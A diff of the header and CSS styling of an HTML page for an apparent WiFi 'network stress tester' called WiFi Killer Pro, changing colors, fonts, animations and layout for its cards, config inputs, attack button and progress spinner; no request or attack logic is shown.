@@ -7,25 +7,23 @@
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="mobile-web-app-capable" content="yes">
-<meta name="description" content="WiFi Killer Pro — Real HTTP Network Stress Tester untuk modul WiFi milik sendiri">
-<title>WiFi Killer Pro — Real Network Stress Tester</title>
+<meta name="description" content="WiFi Killer Pro v3.0 — Real Network Stress Tester">
+<title>WiFi Killer Pro v3.0 — Real Network Stress Tester</title>
 
-<!-- =============================================================
-     FONT AWESOME 6 (ikon fas / fab)
-     ============================================================= -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer">
-
-<!-- =============================================================
-     GOOGLE FONTS
-     ============================================================= -->
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://api.ipify.org">
+<link rel="preconnect" href="https://ipwho.is">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer">
+
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 
 <style>
-/* =================================================================
-   CSS SECTION 1 — RESET & BASE
-   ================================================================= */
+/* ============================================================================
+   1. RESET & BASE
+   ============================================================================ */
 *, *::before, *::after {
   margin: 0;
   padding: 0;
@@ -38,6 +36,7 @@ html {
   scroll-behavior: smooth;
   -webkit-text-size-adjust: 100%;
   text-size-adjust: 100%;
+  overflow-y: scroll;
 }
 
 html, body {
@@ -50,6 +49,12 @@ html, body {
   overflow-x: hidden;
   -webkit-font-smoothing: antialiased;
   -moz-osx-font-smoothing: grayscale;
+  text-rendering: optimizeSpeed;
+}
+
+body {
+  transform: translateZ(0);
+  backface-visibility: hidden;
 }
 
 img, svg, video, canvas { display: block; max-width: 100%; }
@@ -62,10 +67,8 @@ button, input, textarea, select {
   background: none;
 }
 
-button { cursor: pointer; }
-
+button { cursor: pointer; touch-action: manipulation; }
 a { color: inherit; text-decoration: none; }
-
 ul, ol { list-style: none; }
 
 ::selection {
@@ -73,67 +76,43 @@ ul, ol { list-style: none; }
   color: #ffffff;
 }
 
-/* =================================================================
-   CSS SECTION 2 — VARIABLES (TEMA MERAH → PINK → UNGU)
-   ================================================================= */
+/* ============================================================================
+   2. CSS VARIABLES
+   ============================================================================ */
 :root {
-  /* Backgrounds */
   --bg-primary: #0a0004;
   --bg-secondary: #14000a;
-  --card-bg: rgba(26, 0, 18, 0.65);
-  --card-bg-strong: rgba(20, 0, 26, 0.88);
-  --overlay-bg: rgba(0, 0, 0, 0.72);
-
-  /* Accent colors */
+  --card-bg-solid: rgba(24, 0, 16, 0.92);
+  --card-bg-solid-2: rgba(20, 0, 22, 0.92);
   --accent-red: #ff1744;
   --accent-pink: #ff4081;
   --accent-pink-light: #ff80ab;
   --accent-violet: #e040fb;
   --accent-purple: #7c4dff;
   --accent-purple-dark: #651fff;
-
-  /* Text */
   --text-primary: #ffffff;
   --text-secondary: rgba(255, 255, 255, 0.72);
   --text-muted: rgba(255, 255, 255, 0.42);
-  --text-faint: rgba(255, 255, 255, 0.22);
-
-  /* Gradients */
   --grad-main: linear-gradient(135deg, #ff1744 0%, #ff4081 35%, #e040fb 70%, #7c4dff 100%);
-  --grad-main-reverse: linear-gradient(135deg, #7c4dff 0%, #e040fb 35%, #ff4081 70%, #ff1744 100%);
-  --grad-card: linear-gradient(145deg, rgba(26, 0, 18, 0.92) 0%, rgba(20, 0, 26, 0.85) 100%);
+  --grad-card: linear-gradient(145deg, rgba(24, 0, 16, 0.94) 0%, rgba(20, 0, 22, 0.92) 100%);
   --grad-btn-attack: linear-gradient(135deg, #ff1744 0%, #ff4081 50%, #e040fb 100%);
   --grad-btn-stop: linear-gradient(135deg, #e040fb 0%, #7c4dff 100%);
-  --grad-btn-neutral: linear-gradient(135deg, rgba(224, 64, 251, 0.35) 0%, rgba(124, 77, 255, 0.35) 100%);
   --grad-text: linear-gradient(90deg, #ff1744, #ff4081, #e040fb, #7c4dff);
-
-  /* Borders */
   --border-glow: rgba(224, 64, 251, 0.35);
-  --border-subtle: rgba(224, 64, 251, 0.18);
-  --border-strong: rgba(224, 64, 251, 0.55);
-
-  /* Shadows */
-  --shadow-card: 0 8px 32px rgba(255, 23, 68, 0.08), 0 0 25px rgba(224, 64, 251, 0.06) inset;
-  --shadow-btn: 0 8px 30px rgba(255, 23, 68, 0.4), 0 0 20px rgba(224, 64, 251, 0.3);
-  --shadow-btn-hover: 0 8px 42px rgba(255, 23, 68, 0.7), 0 0 32px rgba(224, 64, 251, 0.6);
-  --shadow-modal: 0 0 45px rgba(224, 64, 251, 0.35), 0 20px 60px rgba(255, 23, 68, 0.2);
-
-  /* Sizes */
+  --shadow-card: 0 4px 20px rgba(0, 0, 0, 0.35), 0 0 16px rgba(224, 64, 251, 0.08) inset;
+  --shadow-btn: 0 6px 24px rgba(255, 23, 68, 0.35), 0 0 16px rgba(224, 64, 251, 0.25);
   --radius-sm: 8px;
   --radius-md: 12px;
   --radius-lg: 16px;
   --radius-xl: 20px;
   --radius-2xl: 24px;
-
-  /* Transitions */
   --t-fast: 0.15s ease;
   --t-base: 0.25s ease;
-  --t-slow: 0.4s ease;
 }
 
-/* =================================================================
-   CSS SECTION 3 — BODY BACKGROUND & GRID
-   ================================================================= */
+/* ============================================================================
+   3. BODY BACKGROUND
+   ============================================================================ */
 body {
   position: relative;
   padding: 16px;
@@ -142,11 +121,10 @@ body {
   padding-left: max(16px, env(safe-area-inset-left, 16px));
   padding-right: max(16px, env(safe-area-inset-right, 16px));
   background:
-    radial-gradient(circle at 90% 0%, rgba(255, 23, 68, 0.18) 0%, transparent 50%),
-    radial-gradient(circle at 0% 100%, rgba(124, 77, 255, 0.18) 0%, transparent 50%),
-    radial-gradient(circle at 50% 50%, rgba(224, 64, 251, 0.08) 0%, transparent 70%),
+    radial-gradient(circle at 90% 0%, rgba(255, 23, 68, 0.16) 0%, transparent 45%),
+    radial-gradient(circle at 0% 100%, rgba(124, 77, 255, 0.16) 0%, transparent 45%),
+    radial-gradient(circle at 50% 50%, rgba(224, 64, 251, 0.06) 0%, transparent 60%),
     var(--bg-primary);
-  background-attachment: fixed;
   min-height: 100vh;
   min-height: 100dvh;
 }
@@ -156,31 +134,25 @@ body::before {
   position: fixed;
   inset: 0;
   background-image:
-    linear-gradient(rgba(224, 64, 251, 0.035) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(224, 64, 251, 0.035) 1px, transparent 1px);
+    linear-gradient(rgba(224, 64, 251, 0.028) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(224, 64, 251, 0.028) 1px, transparent 1px);
   background-size: 40px 40px;
   pointer-events: none;
   z-index: 0;
-  animation: gridShift 30s linear infinite;
 }
 
 body::after {
   content: '';
   position: fixed;
   inset: 0;
-  background: radial-gradient(ellipse at center, transparent 40%, rgba(0, 0, 0, 0.4) 100%);
+  background: radial-gradient(ellipse at center, transparent 50%, rgba(0, 0, 0, 0.35) 100%);
   pointer-events: none;
   z-index: 0;
 }
 
-@keyframes gridShift {
-  0%   { background-position: 0 0, 0 0; }
-  100% { background-position: 40px 40px, 40px 40px; }
-}
-
-/* =================================================================
-   CSS SECTION 4 — APP CONTAINER
-   ================================================================= */
+/* ============================================================================
+   4. APP CONTAINER
+   ============================================================================ */
 .app-container {
   position: relative;
   z-index: 1;
@@ -189,44 +161,42 @@ body::after {
   display: flex;
   flex-direction: column;
   gap: 14px;
+  isolation: isolate;
 }
 
-/* =================================================================
-   CSS SECTION 5 — SCROLL REVEAL ANIMATION (IntersectionObserver)
-   ================================================================= */
+/* ============================================================================
+   5. SCROLL REVEAL
+   ============================================================================ */
 .reveal {
   opacity: 0;
-  transform: translateY(28px);
-  transition:
-    opacity 0.65s cubic-bezier(0.16, 1, 0.3, 1),
-    transform 0.65s cubic-bezier(0.16, 1, 0.3, 1);
-  will-change: opacity, transform;
+  transform: translate3d(0, 24px, 0);
+  transition: opacity 0.55s cubic-bezier(0.16, 1, 0.3, 1), transform 0.55s cubic-bezier(0.16, 1, 0.3, 1);
 }
 
 .reveal.active {
   opacity: 1;
-  transform: translateY(0);
+  transform: translate3d(0, 0, 0);
 }
 
-.reveal-delay-1 { transition-delay: 0.05s; }
-.reveal-delay-2 { transition-delay: 0.10s; }
-.reveal-delay-3 { transition-delay: 0.15s; }
-.reveal-delay-4 { transition-delay: 0.20s; }
-.reveal-delay-5 { transition-delay: 0.25s; }
+.reveal-delay-1 { transition-delay: 0.04s; }
+.reveal-delay-2 { transition-delay: 0.08s; }
+.reveal-delay-3 { transition-delay: 0.12s; }
+.reveal-delay-4 { transition-delay: 0.16s; }
 
-/* =================================================================
-   CSS SECTION 6 — GLASS CARD BASE
-   ================================================================= */
+/* ============================================================================
+   6. GLASS CARD
+   ============================================================================ */
 .glass-card {
   background: var(--grad-card);
-  backdrop-filter: blur(20px);
-  -webkit-backdrop-filter: blur(20px);
-  border: 1.5px solid rgba(224, 64, 251, 0.22);
+  border: 1.5px solid rgba(224, 64, 251, 0.20);
   border-radius: var(--radius-xl);
   padding: 20px;
   box-shadow: var(--shadow-card);
   position: relative;
   overflow: hidden;
+  contain: layout style paint;
+  content-visibility: auto;
+  contain-intrinsic-size: 200px;
 }
 
 .glass-card::before {
@@ -236,28 +206,16 @@ body::after {
   left: 0;
   right: 0;
   height: 1px;
-  background: linear-gradient(90deg, transparent, rgba(224, 64, 251, 0.6), transparent);
+  background: linear-gradient(90deg, transparent, rgba(224, 64, 251, 0.55), transparent);
   pointer-events: none;
 }
 
-.glass-card::after {
-  content: '';
-  position: absolute;
-  bottom: 0;
-  left: 0;
-  right: 0;
-  height: 1px;
-  background: linear-gradient(90deg, transparent, rgba(255, 64, 129, 0.3), transparent);
-  pointer-events: none;
-}
-
-/* =================================================================
-   CSS SECTION 7 — HEADER
-   ================================================================= */
+/* ============================================================================
+   7. HEADER
+   ============================================================================ */
 .header-card {
   padding: 26px 20px;
   text-align: center;
-  position: relative;
 }
 
 .header-content {
@@ -275,10 +233,9 @@ body::after {
   width: 44px;
   height: 44px;
   border-radius: 50%;
-  background: rgba(224, 64, 251, 0.12);
-  border: 1.5px solid rgba(224, 64, 251, 0.35);
+  background: rgba(224, 64, 251, 0.10);
+  border: 1.5px solid rgba(224, 64, 251, 0.30);
   flex-shrink: 0;
-  animation: iconPulse 2.4s ease-in-out infinite;
 }
 
 .header-icon-wrap i {
@@ -287,42 +244,31 @@ body::after {
   -webkit-background-clip: text;
   background-clip: text;
   -webkit-text-fill-color: transparent;
-  filter: drop-shadow(0 0 8px rgba(224, 64, 251, 0.6));
-}
-
-@keyframes iconPulse {
-  0%, 100% {
-    box-shadow: 0 0 0 0 rgba(224, 64, 251, 0.4);
-    transform: scale(1);
-  }
-  50% {
-    box-shadow: 0 0 0 12px rgba(224, 64, 251, 0);
-    transform: scale(1.03);
-  }
+  filter: drop-shadow(0 0 6px rgba(224, 64, 251, 0.5));
 }
 
 .title {
   font-family: 'Orbitron', sans-serif;
-  font-size: 26px;
+  font-size: 24px;
   font-weight: 900;
-  letter-spacing: 2.5px;
+  letter-spacing: 2px;
   background: var(--grad-text);
   background-size: 200% auto;
   -webkit-background-clip: text;
   background-clip: text;
   -webkit-text-fill-color: transparent;
-  animation: titleShift 4s linear infinite;
-  line-height: 1.15;
+  animation: titleShift 5s linear infinite;
+  line-height: 1.2;
 }
 
 @keyframes titleShift {
-  0%   { background-position: 0% center; }
+  0% { background-position: 0% center; }
   100% { background-position: 200% center; }
 }
 
 .subtitle {
   font-family: 'Rajdhani', sans-serif;
-  font-size: 12px;
+  font-size: 11px;
   font-weight: 600;
   color: var(--text-muted);
   letter-spacing: 3px;
@@ -330,9 +276,23 @@ body::after {
   margin-top: 6px;
 }
 
-/* =================================================================
-   CSS SECTION 8 — SECTION HEADERS
-   ================================================================= */
+.version-badge {
+  display: inline-block;
+  margin-top: 8px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 9px;
+  font-weight: 700;
+  padding: 2px 8px;
+  border-radius: 4px;
+  background: rgba(224, 64, 251, 0.12);
+  border: 1px solid rgba(224, 64, 251, 0.3);
+  color: var(--accent-violet);
+  letter-spacing: 0.8px;
+}
+
+/* ============================================================================
+   8. SECTION HEADER
+   ============================================================================ */
 .section-header {
   display: flex;
   align-items: center;
@@ -340,21 +300,21 @@ body::after {
   margin-bottom: 14px;
 }
 
-.section-header i {
-  font-size: 18px;
+.section-header > i {
+  font-size: 17px;
   background: var(--grad-main);
   -webkit-background-clip: text;
   background-clip: text;
   -webkit-text-fill-color: transparent;
-  filter: drop-shadow(0 0 6px rgba(224, 64, 251, 0.5));
+  filter: drop-shadow(0 0 4px rgba(224, 64, 251, 0.4));
   flex-shrink: 0;
 }
 
 .section-title {
   font-family: 'Orbitron', sans-serif;
-  font-size: 15px;
+  font-size: 14px;
   font-weight: 700;
-  letter-spacing: 1.4px;
+  letter-spacing: 1.2px;
   color: var(--text-primary);
   text-transform: uppercase;
   flex: 1;
@@ -362,7 +322,7 @@ body::after {
 
 .section-badge {
   font-family: 'JetBrains Mono', monospace;
-  font-size: 10px;
+  font-size: 9.5px;
   font-weight: 700;
   padding: 3px 8px;
   border-radius: 6px;
@@ -370,6 +330,7 @@ body::after {
   border: 1px solid rgba(224, 64, 251, 0.3);
   color: var(--accent-violet);
   letter-spacing: 0.5px;
+  white-space: nowrap;
 }
 
 .section-badge.real {
@@ -390,33 +351,25 @@ body::after {
   color: #ff5252;
 }
 
-/* =================================================================
-   CSS SECTION 9 — WARNING CARD
-   ================================================================= */
-.warning-card {
-  border-color: rgba(255, 64, 129, 0.35);
-}
-
+/* ============================================================================
+   9. WARNING CARD
+   ============================================================================ */
+.warning-card { border-color: rgba(255, 64, 129, 0.30); }
 .warning-card::before {
-  background: linear-gradient(90deg, transparent, rgba(255, 64, 129, 0.8), transparent);
+  background: linear-gradient(90deg, transparent, rgba(255, 64, 129, 0.75), transparent);
 }
 
 .warning-text {
   color: var(--text-secondary);
-  font-size: 13.5px;
+  font-size: 13px;
   line-height: 1.7;
-  font-family: 'Rajdhani', sans-serif;
-  font-weight: 500;
 }
 
-.warning-text strong {
-  color: var(--accent-violet);
-  font-weight: 700;
-}
+.warning-text strong { color: var(--accent-violet); font-weight: 700; }
 
 .warning-text code {
   font-family: 'JetBrains Mono', monospace;
-  font-size: 12px;
+  font-size: 11.5px;
   padding: 1px 6px;
   border-radius: 4px;
   background: rgba(224, 64, 251, 0.15);
@@ -424,27 +377,56 @@ body::after {
   border: 1px solid rgba(224, 64, 251, 0.25);
 }
 
-/* =================================================================
-   CSS SECTION 10 — PERMISSION STATUS ROWS
-   ================================================================= */
+/* ============================================================================
+   10. PROXY WARNING
+   ============================================================================ */
+.proxy-warning {
+  display: none;
+  margin-top: 12px;
+  padding: 12px 14px;
+  background: rgba(255, 82, 82, 0.10);
+  border: 1.5px solid rgba(255, 82, 82, 0.35);
+  border-radius: var(--radius-md);
+  color: #ff8a80;
+  font-size: 12.5px;
+  font-weight: 600;
+  line-height: 1.55;
+}
+
+.proxy-warning.active {
+  display: block;
+  animation: proxyIn 0.3s ease-out;
+}
+
+.proxy-warning i { color: #ff5252; margin-right: 6px; }
+.proxy-warning strong { color: #ffab40; }
+
+@keyframes proxyIn {
+  from { opacity: 0; transform: translateY(-6px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+/* ============================================================================
+   11. PERMISSION ROWS
+   ============================================================================ */
 .perm-row {
   display: flex;
   align-items: center;
   justify-content: space-between;
   gap: 10px;
   padding: 11px 14px;
-  background: rgba(255, 255, 255, 0.04);
-  border: 1px solid rgba(224, 64, 251, 0.15);
+  background: rgba(255, 255, 255, 0.035);
+  border: 1px solid rgba(224, 64, 251, 0.14);
   border-radius: var(--radius-md);
   margin-bottom: 8px;
-  transition: all var(--t-base);
+  transition: border-color var(--t-base), background var(--t-base);
 }
 
 .perm-row:last-child { margin-bottom: 0; }
 
 .perm-row:hover {
-  border-color: rgba(224, 64, 251, 0.4);
-  background: rgba(255, 255, 255, 0.06);
+  border-color: rgba(224, 64, 251, 0.35);
+  background: rgba(255, 255, 255, 0.05);
 }
 
 .perm-label {
@@ -459,20 +441,16 @@ body::after {
   letter-spacing: 0.8px;
 }
 
-.perm-label i {
-  font-size: 13px;
-  color: var(--accent-violet);
-}
+.perm-label i { font-size: 12px; color: var(--accent-violet); }
 
 .perm-status {
   font-family: 'JetBrains Mono', monospace;
-  font-size: 11px;
+  font-size: 10.5px;
   font-weight: 700;
   padding: 3px 10px;
   border-radius: 6px;
   text-align: center;
-  min-width: 90px;
-  transition: all var(--t-base);
+  min-width: 88px;
 }
 
 .perm-status.granted {
@@ -497,27 +475,18 @@ body::after {
   background: rgba(100, 181, 246, 0.14);
   border: 1px solid rgba(100, 181, 246, 0.4);
   color: #64b5f6;
-  animation: blink 1.2s ease-in-out infinite;
 }
 
-@keyframes blink {
-  0%, 100% { opacity: 1; }
-  50%      { opacity: 0.5; }
-}
-
-/* =================================================================
-   CSS SECTION 11 — CONFIG (INPUT TARGET & SETTINGS)
-   ================================================================= */
-.config-group {
-  margin-bottom: 12px;
-}
-
+/* ============================================================================
+   12. CONFIG
+   ============================================================================ */
+.config-group { margin-bottom: 12px; }
 .config-group:last-child { margin-bottom: 0; }
 
 .config-label {
   display: block;
   font-family: 'Orbitron', sans-serif;
-  font-size: 10.5px;
+  font-size: 10px;
   font-weight: 700;
   color: var(--accent-violet);
   letter-spacing: 1px;
@@ -525,15 +494,9 @@ body::after {
   margin-bottom: 6px;
 }
 
-.config-label i {
-  margin-right: 5px;
-  font-size: 11px;
-}
+.config-label i { margin-right: 5px; font-size: 10px; }
 
-.config-input-row {
-  display: flex;
-  gap: 8px;
-}
+.config-input-row { display: flex; gap: 8px; }
 
 .config-input {
   flex: 1;
@@ -546,7 +509,7 @@ body::after {
   font-family: 'JetBrains Mono', monospace;
   font-size: 12.5px;
   font-weight: 500;
-  transition: all var(--t-base);
+  transition: border-color var(--t-base), background var(--t-base);
 }
 
 .config-input::placeholder {
@@ -558,16 +521,18 @@ body::after {
 .config-input:focus {
   border-color: var(--accent-violet);
   background: rgba(224, 64, 251, 0.08);
-  box-shadow: 0 0 0 3px rgba(224, 64, 251, 0.15);
 }
 
-.config-input:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
+.config-input:disabled { opacity: 0.5; cursor: not-allowed; }
+
+.config-input.error {
+  border-color: #ff5252;
+  background: rgba(255, 82, 82, 0.06);
 }
 
 .config-select {
-  padding: 10px 14px;
+  width: 100%;
+  padding: 10px 32px 10px 14px;
   background: rgba(255, 255, 255, 0.05);
   border: 1px solid rgba(224, 64, 251, 0.25);
   border-radius: var(--radius-md);
@@ -576,37 +541,33 @@ body::after {
   font-size: 12.5px;
   font-weight: 600;
   cursor: pointer;
-  transition: all var(--t-base);
+  transition: border-color var(--t-base), background var(--t-base);
   -webkit-appearance: none;
   appearance: none;
   background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23e040fb' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'/%3e%3c/svg%3e");
   background-repeat: no-repeat;
   background-position: right 10px center;
   background-size: 14px;
-  padding-right: 32px;
 }
 
-.config-select:focus {
-  border-color: var(--accent-violet);
-  background-color: rgba(224, 64, 251, 0.08);
-}
-
-.config-select option {
-  background: #14000a;
-  color: #ffffff;
-}
+.config-select:focus { border-color: var(--accent-violet); background-color: rgba(224, 64, 251, 0.08); }
+.config-select option { background: #14000a; color: #ffffff; }
 
 .config-hint {
   margin-top: 6px;
   font-size: 11px;
   color: var(--text-muted);
-  font-family: 'Rajdhani', sans-serif;
-  font-weight: 500;
   line-height: 1.5;
 }
 
-.config-hint strong {
-  color: var(--accent-pink);
+.config-hint strong { color: var(--accent-pink); }
+.config-hint code {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10.5px;
+  padding: 0 4px;
+  border-radius: 3px;
+  background: rgba(224, 64, 251, 0.12);
+  color: var(--accent-violet);
 }
 
 .config-toggle {
@@ -614,16 +575,16 @@ body::after {
   align-items: center;
   justify-content: space-between;
   padding: 10px 14px;
-  background: rgba(255, 255, 255, 0.04);
-  border: 1px solid rgba(224, 64, 251, 0.15);
+  background: rgba(255, 255, 255, 0.035);
+  border: 1px solid rgba(224, 64, 251, 0.14);
   border-radius: var(--radius-md);
   cursor: pointer;
-  transition: all var(--t-base);
+  transition: border-color var(--t-base), background var(--t-base);
 }
 
 .config-toggle:hover {
   border-color: rgba(224, 64, 251, 0.35);
-  background: rgba(255, 255, 255, 0.06);
+  background: rgba(255, 255, 255, 0.05);
 }
 
 .config-toggle-label {
@@ -636,10 +597,7 @@ body::after {
   color: var(--text-secondary);
 }
 
-.config-toggle-label i {
-  font-size: 13px;
-  color: var(--accent-violet);
-}
+.config-toggle-label i { font-size: 13px; color: var(--accent-violet); }
 
 .toggle-switch {
   position: relative;
@@ -647,8 +605,9 @@ body::after {
   height: 24px;
   background: rgba(255, 255, 255, 0.12);
   border-radius: 12px;
-  transition: all var(--t-base);
+  transition: background var(--t-base);
   flex-shrink: 0;
+  display: inline-block;
 }
 
 .toggle-switch::after {
@@ -660,42 +619,41 @@ body::after {
   height: 18px;
   border-radius: 50%;
   background: #ffffff;
-  transition: all var(--t-base);
+  transition: transform var(--t-base);
   box-shadow: 0 1px 3px rgba(0, 0, 0, 0.4);
 }
 
 .config-toggle input { display: none; }
+.config-toggle input:checked + .toggle-switch { background: var(--grad-btn-attack); }
+.config-toggle input:checked + .toggle-switch::after { transform: translateX(18px); }
+.config-toggle input:disabled + .toggle-switch { opacity: 0.4; }
 
-.config-toggle input:checked + .toggle-switch {
-  background: var(--grad-btn-attack);
-}
-
-.config-toggle input:checked + .toggle-switch::after {
-  transform: translateX(18px);
-}
-
-/* =================================================================
-   CSS SECTION 12 — INFO ROWS (NETWORK INFORMATION)
-   ================================================================= */
+/* ============================================================================
+   13. INFO ROWS
+   ============================================================================ */
 .info-row {
   display: flex;
   align-items: center;
   justify-content: space-between;
   gap: 8px;
   padding: 11px 14px;
-  background: rgba(255, 255, 255, 0.04);
-  border: 1px solid rgba(224, 64, 251, 0.15);
+  background: rgba(255, 255, 255, 0.035);
+  border: 1px solid rgba(224, 64, 251, 0.14);
   border-radius: var(--radius-md);
   margin-bottom: 8px;
-  transition: all var(--t-base);
+  transition: border-color var(--t-base), background var(--t-base);
 }
 
 .info-row:last-child { margin-bottom: 0; }
 
 .info-row:hover {
-  border-color: rgba(224, 64, 251, 0.4);
-  background: rgba(255, 255, 255, 0.06);
-  box-shadow: 0 0 15px rgba(224, 64, 251, 0.1);
+  border-color: rgba(224, 64, 251, 0.35);
+  background: rgba(255, 255, 255, 0.05);
+}
+
+.info-row.isp-row {
+  background: rgba(224, 64, 251, 0.04);
+  border-color: rgba(224, 64, 251, 0.22);
 }
 
 .info-label {
@@ -704,22 +662,19 @@ body::after {
   gap: 8px;
   font-family: 'Orbitron', sans-serif;
   font-weight: 700;
-  font-size: 11px;
+  font-size: 10.5px;
   color: var(--accent-violet);
   text-transform: uppercase;
-  letter-spacing: 0.8px;
+  letter-spacing: 0.7px;
   flex-shrink: 0;
 }
 
-.info-label i {
-  font-size: 12px;
-  color: var(--accent-violet);
-}
+.info-label i { font-size: 11px; color: var(--accent-violet); }
 
 .info-value {
   font-family: 'JetBrains Mono', monospace;
   font-weight: 700;
-  font-size: 12.5px;
+  font-size: 12px;
   color: var(--text-primary);
   text-align: right;
   word-break: break-all;
@@ -727,53 +682,44 @@ body::after {
   min-width: 0;
 }
 
-.info-value.loading {
-  color: var(--text-muted);
-  font-style: italic;
-}
+.info-value.loading { color: var(--text-muted); font-style: italic; }
+.info-value.error { color: #ff5252; }
 
-.info-value.error {
-  color: #ff5252;
+.info-value.isp {
+  font-family: 'Rajdhani', sans-serif;
+  font-weight: 700;
+  font-size: 12.5px;
+  color: var(--accent-pink-light);
+  text-transform: capitalize;
 }
 
 .refresh-btn {
-  background: rgba(224, 64, 251, 0.1);
+  background: rgba(224, 64, 251, 0.10);
   border: 1px solid rgba(224, 64, 251, 0.3);
   color: var(--accent-violet);
   padding: 6px 10px;
   border-radius: var(--radius-sm);
   font-family: 'Orbitron', sans-serif;
-  font-size: 10px;
+  font-size: 9.5px;
   font-weight: 700;
   letter-spacing: 1px;
   cursor: pointer;
   display: inline-flex;
   align-items: center;
   gap: 6px;
-  transition: all var(--t-base);
+  transition: background var(--t-base), border-color var(--t-base);
 }
 
-.refresh-btn:hover {
-  background: rgba(224, 64, 251, 0.22);
-  border-color: var(--accent-violet);
-  transform: translateY(-1px);
-}
-
+.refresh-btn:hover { background: rgba(224, 64, 251, 0.20); border-color: var(--accent-violet); }
 .refresh-btn:active { transform: scale(0.94); }
-
 .refresh-btn i { font-size: 10px; }
+.refresh-btn.spinning i { animation: spin 0.9s linear infinite; }
 
-.refresh-btn.spinning i {
-  animation: spin 0.9s linear infinite;
-}
+@keyframes spin { to { transform: rotate(360deg); } }
 
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-/* =================================================================
-   CSS SECTION 13 — ATTACK BUTTON
-   ================================================================= */
+/* ============================================================================
+   14. ATTACK BUTTON
+   ============================================================================ */
 .attack-btn {
   width: 100%;
   padding: 18px 24px;
@@ -787,63 +733,26 @@ body::after {
   font-weight: 900;
   letter-spacing: 1.8px;
   cursor: pointer;
-  transition: all var(--t-base);
+  transition: transform var(--t-fast), box-shadow var(--t-base);
   box-shadow: var(--shadow-btn);
   display: flex;
   align-items: center;
   justify-content: center;
   gap: 12px;
-  animation: btnPulse 2.2s ease-in-out infinite;
   position: relative;
   overflow: hidden;
   -webkit-appearance: none;
   appearance: none;
-}
-
-.attack-btn::before {
-  content: '';
-  position: absolute;
-  top: 0;
-  left: -100%;
-  width: 100%;
-  height: 100%;
-  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.28), transparent);
-  animation: btnShine 3.2s linear infinite;
-  pointer-events: none;
-}
-
-@keyframes btnShine {
-  0%   { left: -100%; }
-  100% { left: 100%; }
-}
-
-@keyframes btnPulse {
-  0%, 100% { box-shadow: var(--shadow-btn); }
-  50%      { box-shadow: var(--shadow-btn-hover); }
-}
-
-.attack-btn:hover {
-  background-position: right center;
-  transform: translateY(-2px);
+  touch-action: manipulation;
 }
 
 .attack-btn:active { transform: scale(0.98); }
-
-.attack-btn:disabled {
-  opacity: 0.6;
-  cursor: not-allowed;
-  animation: none;
-}
+.attack-btn:hover { background-position: right center; box-shadow: 0 8px 32px rgba(255, 23, 68, 0.5), 0 0 22px rgba(224, 64, 251, 0.4); }
+.attack-btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
 .attack-btn.stop {
   background: var(--grad-btn-stop);
   background-size: 200% auto;
-  animation: btnPulseStop 1.2s ease-in-out infinite;
-}
-
-@keyframes btnPulseStop {
-  0%, 100% { box-shadow: 0 8px 30px rgba(124, 77, 255, 0.4); }
-  50%      { box-shadow: 0 8px 42px rgba(224, 64, 251, 0.85); }
 }
 
 .btn-icon-wrap {
@@ -855,23 +764,15 @@ body::after {
   position: relative;
 }
 
-.btn-icon {
-  font-size: 20px;
-  line-height: 1;
-}
-
+.btn-icon { font-size: 20px; line-height: 1; }
 .btn-icon-stop { display: none; }
 .attack-btn.stop .btn-icon-start { display: none; }
-.attack-btn.stop .btn-icon-stop  { display: inline-block; }
+.attack-btn.stop .btn-icon-stop { display: inline-block; }
+.btn-text { white-space: nowrap; }
 
-.btn-text {
-  white-space: nowrap;
-  font-size: inherit;
-}
-
-/* =================================================================
-   CSS SECTION 14 — PROGRESS BOX
-   ================================================================= */
+/* ============================================================================
+   15. PROGRESS BOX
+   ============================================================================ */
 .progress-box {
   display: none;
   flex-direction: column;
@@ -879,32 +780,26 @@ body::after {
   gap: 14px;
   padding: 22px 16px;
   border-radius: var(--radius-xl);
-  background: rgba(224, 64, 251, 0.05);
-  border: 1.5px solid rgba(255, 64, 129, 0.28);
-  animation: progressIn 0.35s ease-out;
+  background: rgba(224, 64, 251, 0.04);
+  border: 1.5px solid rgba(255, 64, 129, 0.25);
 }
 
 .progress-box.active { display: flex; }
 
-@keyframes progressIn {
-  from { opacity: 0; transform: scale(0.94); }
-  to   { opacity: 1; transform: scale(1); }
-}
-
 .spinner {
-  width: 68px;
-  height: 68px;
+  width: 60px;
+  height: 60px;
   border-radius: 50%;
   background: conic-gradient(from 0deg, transparent 0%, #ff1744 25%, #e040fb 50%, #7c4dff 75%, transparent 100%);
   animation: spin 1.2s linear infinite;
   position: relative;
-  box-shadow: 0 0 30px rgba(224, 64, 251, 0.5);
+  box-shadow: 0 0 20px rgba(224, 64, 251, 0.4);
 }
 
 .spinner::before {
   content: '';
   position: absolute;
-  inset: 6px;
+  inset: 5px;
   border-radius: 50%;
   background: #0a0004;
 }
